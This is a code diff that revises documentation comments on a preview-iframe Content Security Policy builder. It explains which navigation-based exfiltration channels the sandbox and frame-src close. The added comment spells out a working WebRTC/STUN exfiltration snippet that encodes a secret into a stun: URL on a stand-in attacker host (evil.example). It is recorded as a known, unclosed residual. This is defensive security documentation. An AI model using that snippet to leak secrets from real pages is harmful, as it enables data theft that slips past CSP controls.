@@ -227,11 +227,31 @@ export interface PreviewCsp {
  * else (`buildSpaCsp()` in `apps/api/src/routes/spa.ts`). Verified in Chrome
  * against that exact pair of headers: the frame's attempt to navigate itself to
  * an outside origin is blocked with NO network request to the target, while its
- * legitimate initial load still succeeds. What remains possible is navigation
- * WITHIN the allowed origin — the agent document can replace itself with another
- * document on the preview origin, which serves nothing but token-bound preview
- * bytes, i.e. the trust level the frame already had. What is closed is every
- * CROSS-origin navigation, which was the exfiltration channel.
+ * legitimate initial load still succeeds. What is closed is every CROSS-origin
+ * NAVIGATION — not exfiltration in general (below).
+ *
+ * What remains possible is navigation WITHIN the allowed origin, and that
+ * residual is not the same size in both modes:
+ *  - `USERCONTENT_URL` mode — that origin serves nothing but token-bound preview
+ *    bytes, so the frame reaches only the trust level it already had.
+ *  - DEFAULT mode — `frame-src 'self'` is the WHOLE app origin (SPA, `/api/*`,
+ *    `/login`), so the frame may navigate itself to any app-origin page. Still
+ *    not an exfiltration channel: the frame is opaque-origin, so SameSite cookies
+ *    are not sent on that navigation, and `frame-src` is re-enforced across a 302
+ *    (measured), so an open redirect cannot launder it back out cross-origin.
+ *
+ * NAMED RESIDUAL — WebRTC/STUN, and it is not closed by anything above. From
+ * inside the frame, `new RTCPeerConnection({ iceServers: [{ urls: "stun:" +
+ * secret + ".evil.example:3478" }] })` followed by `createOffer()` /
+ * `setLocalDescription()` ships the secret out as a DNS lookup plus a STUN
+ * packet. No navigation, no fetch, no form, no popup — so `sandbox`,
+ * `frame-src`, `connect-src 'none'` and `form-action 'none'` are ALL irrelevant
+ * to it; measured against this exact header pair, 8 UDP packets arrived at the
+ * attacker's host. It is PRE-EXISTING and is not worsened by the containment
+ * described above (which only ever removed a channel). There is no cheap fix:
+ * adding `webrtc 'block'` to this policy was measured NOT to stop it — Chrome
+ * 149 does not enforce that directive — so it would be a directive that READS
+ * like a control while blocking nothing, and is deliberately absent.
  *
  * The embedding iframe declares the SAME token set (`PREVIEW_IFRAME_SANDBOX` in
  * `apps/web/src/components/document-preview.tsx`) and the two sandboxes
@@ -248,6 +268,14 @@ export interface PreviewCsp {
  * the return TYPE ({@link PreviewCsp}), not in a comment: the header copy is the
  * meta copy plus the sandbox directive, and every OTHER directive is added to
  * both by construction.
+ *
+ * `frame-ancestors` is ignored in a meta context just the same and is kept there
+ * anyway — not an inconsistency, a different case: it is still ENFORCED by the
+ * header copy, so its presence in the meta copy is redundant-but-true, while
+ * `sandbox` there would be the only place the policy is stated at all in the
+ * direction that matters (collapsing the two strings into one to remove the
+ * divergence is precisely what would drop `sandbox` from the HEADER, where it
+ * is the control).
  */
 export function buildPreviewCsp(appOrigin: string): PreviewCsp {
   const meta = [
@@ -293,9 +321,11 @@ export function buildPreviewCsp(appOrigin: string): PreviewCsp {
  *
  * A separate `USERCONTENT_URL` origin therefore grants no exemption here. It is
  * still worth configuring for a different reason: it gives the preview its own
- * cookie jar, storage partition and process (site isolation), and unlike a CSP
- * it survives a proxy that strips response headers or a UA that ignores
- * `sandbox`. What it cannot do is make a top-level render containable.
+ * cookie jar, storage partition and process (site isolation), and it is the only
+ * layer left if the response's `sandbox` is not in force — a UA that ignores
+ * sandboxing, or a future app-origin page that frames the preview WITHOUT the
+ * `sandbox` attribute (`frame-ancestors` permits any app-origin embedder). What
+ * it cannot do is make a top-level render containable.
  *
  * `Sec-Fetch-Dest` is a browser-set, script-unforgeable header, so it is the
  * authoritative statement of the loading context, and the decision is
